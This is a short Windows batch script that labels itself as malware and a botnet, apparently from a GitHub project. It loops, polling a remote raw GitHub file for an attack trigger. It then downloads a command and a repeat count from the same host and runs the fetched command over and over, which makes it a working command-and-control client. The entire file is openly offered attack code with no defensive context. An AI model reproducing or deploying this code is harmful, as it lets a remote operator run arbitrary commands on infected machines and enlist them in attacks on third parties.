@echo off
setlocal ENABLEDELAYEDEXPANSION
::Wanchun Ware by craciu25_YT. Malware/Botnet
set listener=1
set totallistener=1



::Listener. It looks for the order.
:listener
set listener=1
echo [Listener] Trying req [%listener%] Total times: [%totallistener%]
set /a listener=%listener%+1
set /a totallistener=%totallistener%+1
curl https://raw.githubusercontent.com/AuchenDevs/Wanchun-Malware/main/attack --silent | >nul find "yes" && goto prefounded 
echo [Listener] Timeout. Times tried: [%listener%] Total times: [%totallistener%]
timeout 5 >nul
goto listener



::When the order was executed
:prefounded
set /a time=0
for /F "tokens=*" %%I in ('curl https://raw.githubusercontent.com/AuchenDevs/Wanchun-Malware/main/command --silent') do set cmd=%%I
for /F "tokens=*" %%I in ('curl https://raw.githubusercontent.com/AuchenDevs/Wanchun-Malware/main/times --silent') do set times=%%I
goto founded


:founded
%cmd% 
set /a time=%time%+1 
set /a totaltime=%totaltime%+1 
echo [Payload] Pinged [%time%/%times%] Total: %totaltime%
if %time% GEQ %times% (goto listener)
goto founded